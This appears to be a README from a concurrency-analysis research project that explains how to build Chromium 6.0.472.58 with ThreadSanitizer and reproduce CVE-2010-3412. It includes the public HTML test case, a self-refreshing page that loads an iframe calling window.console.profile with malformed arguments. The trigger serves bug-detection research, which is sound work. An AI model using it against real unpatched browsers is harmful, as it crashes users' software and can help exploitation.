# Chromium - 6.0.472.58
This project is for building chromium-6.0.472.58 with Tsan in order to test [CVE-2010-3412](http://www.cvedetails.com/cve/CVE-2010-3412/)

The runtime of this project could be recommended for building on Ubuntu 14.04

## Build the LLVM, clang and compiler
Follow the same steps to install [LLVM-3.7.1 & clang-3.7.1 and compiler-3.7.1](https://github.com/ruigulala/ConAnalysis#install-llvm-361--clang-361).
However, you need to be attention for two significant modifications.
* Before the step of building LLVM together with Clang using CMake, you must apply a patch which disables the tsan hooks.
```compiler-rt.chromium.patch``` can be found in the source code. Patching for the folder ```compiler-rt``` under ```llvm-3.7.1.src/projects/```
```
patch -p1 < compiler-rt.chromium.patch --dry-run (to check)
patch -p1 < compiler-rt.chromium.patch (to patch)
```
* While come to the step of ```cmake ..```, you need to build with ```-DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON```
```
cmake .. -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON
```

## Install ```depot_tools``` for using ```gclient``` to build chromium
* Check ```git``` is installed
* Clone ```depot_tools```
```
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
```
* Add depot_tools to your PATH
```
export PATH=`pwd`/depot_tools:"$PATH"
```

## Build Chromium-6.0.472.58
* Download ```6.0.472.58-tsan.tar.gz```, and decompress it. The ```6.0.472.58-tsan.tar.gz``` file can be found in the source code
```
cd 6.0.472.58-tsan
```
* Use command to configure gclient
```
gclient config https://src.chromium.org/chrome/releases/6.0.472.58
```
* Generate the source code of Chromium (DEPS file will configure the Chromium automatically) 
```
gclient sync --force
```
* After waiting for a few mintues, there are two folders generated one is ```chromeos``` the other is called ```src```. Download ```chromium.patch``` to current folder, and patch for the source code.
```
patch -p1 < chromium.patch --dry-run (to check)
patch -p1 < chromium.patch (to patch)
```
* Setup the environment variables
```
export CFLAGS="-no-integrated-as -fPIC -fsanitize=thread -gline-tables-only"
export CXXFLAGS="$CFLAGS"
export LDFLAGS="-pie -fsanitize=thread -gline-tables-only -Wl,--allow-multiple-definition"
export CC=/your/path/clang
export CXX=/your/path/clang++
```
* Go to ```src```
```
cd ./src
```
* Generate a executable at ```./src/out/Debug/chrome```
```
GYP_DEFINES="werror=" ./build/gyp_chromium
make -j`nproc` chrome
```

## Test Chromium
* Set the ```TSAN_OPTIONS```
```
export TSAN_OPTIONS="exitcode=0 log_path=/your/path/error_log.log"
```
* Run Chromium with Tsan, there are some error logs at your path
```
./out/Debug/chrome
```

## Test [CVE-2010-3412](http://www.cvedetails.com/cve/CVE-2010-3412/)
* Run the test case [console profiles](https://bugs.chromium.org/p/chromium/issues/detail?id=51919)
```
Create two htm files console.htm and index.htm and run with Chromium

-----console.htm----
<script>
window.console.profile(document.createElement("td"),eval,null,null);
window.console.profile(1000000000,window.console.time);
window.console.profile(null,null,1000000000);
</script>
------index.htm-----
<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">
<iframe src="console.htm"></iframe>
```

## FAQ
* During generating a executable at ```./src/out/Debug/chrome```, you may face some compiler errors about being lack of certain dependencies. Do not worry about that, you should find the libraries first according to the error message. Then, install the related dependencies. Finally, you fix the problems by yourself.
```
sudo apt-get install -f
sudo apt-get install "dependencies"
```
